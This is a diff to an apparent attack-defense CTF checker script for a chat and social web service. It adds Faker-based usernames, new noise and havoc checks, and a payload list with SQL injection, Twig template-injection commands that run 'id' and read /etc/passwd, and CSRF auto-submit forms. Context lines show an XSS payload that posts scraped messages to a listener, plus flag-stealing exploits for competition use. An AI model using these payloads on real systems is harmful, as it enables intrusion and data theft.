@@ -23,8 +23,9 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import multiprocessing
 import hashlib
 import os
+from faker import Faker
 
-
+fake = Faker()
 HOST = "0.0.0.0"
 PORT = 6452
 
@@ -36,6 +37,8 @@ chrome_options = webdriver.ChromeOptions()
 chrome_options.add_argument("--headless")
 chrome_options.add_argument('--no-sandbox')
 driver = webdriver.Chrome('/usr/bin/chromedriver', options=chrome_options)
+
+
 def encode(message, recipient, logger):
     message = message.encode('utf-8').hex()
     recipient = recipient * (len(message) // len(recipient) + 1)
@@ -44,12 +47,22 @@ def encode(message, recipient, logger):
     return encoded_message
 
 
-async def register(task, client, username, password, logger):
-    logger.debug(f"Registering as {username}:{password}")
-    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
+async def register(task, client, password, logger):
+    r = None
+    username = None
+    for _ in range(10):
+        username = fake.name().lower().replace(' ', '_') + str(random.randint(0, 100000))
+        logger.debug(f"Registering as {username}:{password}")
+        r = await client.post(f"{getUrl(task)}/register",
+                              json={"username": username, "password": password, "confirmPassword": password})
+        if r.status_code == 302:
+            break
     assert_equals(r.status_code, 302, "registering failed")
-    return r.cookies
+    return r.cookies, username
 
+
+def generateNoise():
+    return fake.text()
 
 async def login(task, client, username, password, logger):
     logger.debug(f"Logging in as {username}:{password}")
@@ -59,11 +72,11 @@ async def login(task, client, username, password, logger):
 
 
 async def sendMessage(task, client, recipient, message, logger):
-    username = secrets.token_hex(32)
     password = 'password'
     encoded_message = encode(message, recipient, logger)
-    cookie = await register(task, client, username, password, logger)
-    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message}, cookies=cookie)
+    cookie, username = await register(task, client, password, logger)
+    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message},
+                      cookies=cookie)
     return username, password, cookie
 
 
@@ -74,19 +87,24 @@ async def retrieveMessage(task, client, recipient, logger, username, password):
     assert_equals(r.status_code, 200, "retrieving message failed")
     return r
 
+
 async def createChatroom(task, name, public, client, cookie, logger):
     logger.debug(f"Creating private chatroom {name}")
-    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'}, cookies=cookie)
+    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'},
+                          cookies=cookie)
     assert_equals(r.status_code, 200, "creating private chatroom failed")
     return r.text
 
+
 @checker.putflag(0)
-async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> Optional[str]:
+async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
+Optional[str]:
     flag = task.flag
     recipient = "admin"
     username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
     await chain_db.set("userdata", (username, password, flag))
     return json.dumps({'username': username})
+
 
 @checker.getflag(0)
 async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
@@ -105,14 +123,14 @@ async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
     while len(driver.page_source.split('<div class="modal-body" style="white-space: pre-line">')) > 1 \
             and time.time() - start < ((task.timeout / 1000) - 1):
         driver.get(f"{getUrl(task)}/messages/admin")
-    
-    
+
+
 @checker.putflag(1)
-async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> Optional[str]:
+async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
+Optional[str]:
     flag = task.flag
-    username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     roomName = secrets.token_hex(10)
     roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
     logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
@@ -134,8 +152,9 @@ async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
 
 
 @checker.putnoise(0)
-async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
-    noise = secrets.token_hex(32)
+async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    noise = generateNoise()
     recipient = "admin"
     username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
     await chain_db.set("noise", (username, password, noise))
@@ -152,11 +171,11 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
 
 
 @checker.putnoise(1)
-async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
-    noise = secrets.token_hex(32)
-    username = secrets.token_hex(32)
+async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    noise = generateNoise()
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     roomName = secrets.token_hex(10)
     roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
     logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
@@ -165,8 +184,8 @@ async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain
     r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
     assert_equals(r.status_code, 302, "sending message failed")
     await chain_db.set("noise", (username, password, noise, roomUrl))
-    
-    
+
+
 @checker.getnoise(1)
 async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
     try:
@@ -181,10 +200,9 @@ async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
 @checker.putnoise(2)
 async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                     logger: LoggerAdapter) -> None:
-    noise = secrets.token_hex(32)
-    username = secrets.token_hex(32)
+    noise = generateNoise()
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     roomName = secrets.token_hex(10)
     roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
     logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
@@ -210,9 +228,8 @@ async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
 @checker.putnoise(3)
 async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                     logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     profilePic = random.choice(range(1, 50))
     r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
     assert_equals(r.status_code, 200, "setting profile picture failed")
@@ -233,13 +250,12 @@ async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
 @checker.putnoise(4)
 async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                     logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    message = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
-    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': message}, cookies=cookie)
+    noise = generateNoise()
+    cookie, username = await register(task, client, password, logger)
+    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
     assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
-    await chain_db.set("noise", (username, password, message))
+    await chain_db.set("noise", (username, password, noise))
 
 
 @checker.getnoise(4)
@@ -253,10 +269,39 @@ async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(message, r.text, "message missing from profile")
 
 
+@checker.putnoise(5)
+async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    noise = generateNoise()
+    cookie, username = await register(task, client, password, logger)
+    partnerCookie, partner = await register(task, client, password, logger)
+    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
+    assert_equals(r.status_code, 200, "sending friend request failed")
+    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=cookie)
+    assert_equals(r.status_code, 200, "accepting friend request failed")
+    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
+    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
+    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
+    assert_in(noise, r.text, "message missing from profile")
+    await chain_db.set("noise", (username, partner, password, noise))
+
+
+@checker.getnoise(5)
+async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, partner, password, noise = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
+    assert_in(noise, r.text, "noise missing from profile")
+
+
 @checker.havoc(0)
 async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
+                 logger: LoggerAdapter) -> None:
+    username = fake.name()
     password = secrets.token_hex(32)
     r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
     assert_equals(r.status_code, 401, "login with invalid credentials succeeded")
@@ -264,10 +309,11 @@ async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: C
 
 @checker.havoc(1)
 async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
+                 logger: LoggerAdapter) -> None:
+    username = fake.name()
     password = secrets.token_hex(32)
-    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
+    r = await client.post(f"{getUrl(task)}/register",
+                          json={"username": username, "password": password, "confirmPassword": password})
     assert_equals(r.status_code, 302, "register with valid credentials failed")
     r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password})
     assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")
@@ -275,30 +321,69 @@ async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: C
 
 @checker.havoc(2)
 async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
+                 logger: LoggerAdapter) -> None:
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
     assert_equals(r.status_code, 200, "getting profile failed")
 
 
 @checker.havoc(3)
 async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    username = secrets.token_hex(32)
+                 logger: LoggerAdapter) -> None:
     password = secrets.token_hex(32)
     encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
-    cookie = await register(task, client, username, password, logger)
-    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": secrets.token_hex(32), "message": encoded_message},
-                      cookies=cookie)
+    cookie, username = await register(task, client, password, logger)
+    r = await client.post(f"{getUrl(task)}/messages/",
+                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
+                          cookies=cookie)
     assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")
+
+
+@checker.havoc(4)
+async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    cookie, _ = await register(task, client, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/admin", cookies=cookie)
+    logger.debug(r.text, r.status_code, 'havoc4')
+    assert_equals(r.status_code, 400, "getting profile of admin succeeded")
+
+
+fakePayloads = [
+    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
+    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+    "{{[0]|reduce('system','id')}}",
+    "{{['id']|map('system')|join}}",
+    "{{['id']|filter('system')}}",
+    "{{['id',1]|sort('system')|join}}",
+    "{{['cat\x20/etc/passwd']|filter('system')}}",
+    "{{['cat$IFS/etc/passwd']|filter('system')}}",
+    "{{['id']|filter('passthru')}}",
+    "{['id']|map('passthru')}}",
+    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+     <input name="username" type="hidden" value="CSRFd" />
+     <input type="submit" value="Submit Request" />
+    </form>
+    <script>
+     document.getElementById("autosubmit").submit();
+    </script>""",
+    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
+]
+
+
+@checker.havoc(5)
+async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    await client.post(f"{getUrl(task)}/login", json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})
 
 
 exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                  "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                  " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                  "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
+
 
 def server(logger):
     class ExploitServer(BaseHTTPRequestHandler):
@@ -319,18 +404,21 @@ def server(logger):
     webServer = HTTPServer((HOST, PORT), ExploitServer)
     webServer.serve_forever()
 
+
 def getFlag():
     while True:
         if os.path.isfile("/checker/flag.txt") and os.access("/checker/flag.txt", os.R_OK):
             with open("/checker/flag.txt", "r") as flag:
                 return flag.read()
+
+
 @checker.exploit(0)
-async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
+                   logger: LoggerAdapter) -> Optional[str]:
     process = multiprocessing.Process(target=server, args=(logger,))
     process.start()
-    username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     target = json.loads(task.attack_info)['username']
     payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
@@ -350,15 +438,18 @@ def xss_test(task, logger):
     driver.execute_script("document.getElementsByTagName('form')[0].submit();")
     driver.get(f"{getUrl(task)}/messages/admin")
 
+
 @checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
-    username = secrets.token_hex(32)
+async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
+                   logger: LoggerAdapter) -> Optional[str]:
     password = secrets.token_hex(32)
-    cookie = await register(task, client, username, password, logger)
+    cookie, username = await register(task, client, password, logger)
     target = json.loads(task.attack_info)['username']
-    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
     assert_equals(r.status_code, 200, "sending friend request failed")
-    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
     assert_equals(r.status_code, 200, "accepting friend request failed")
     r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
     if len(r.text.split('<h3>')) < 2:
@@ -368,6 +459,7 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
     if flag := searcher.search_flag(r.text):
         return flag
+
 
 if __name__ == "__main__":
     checker.run()
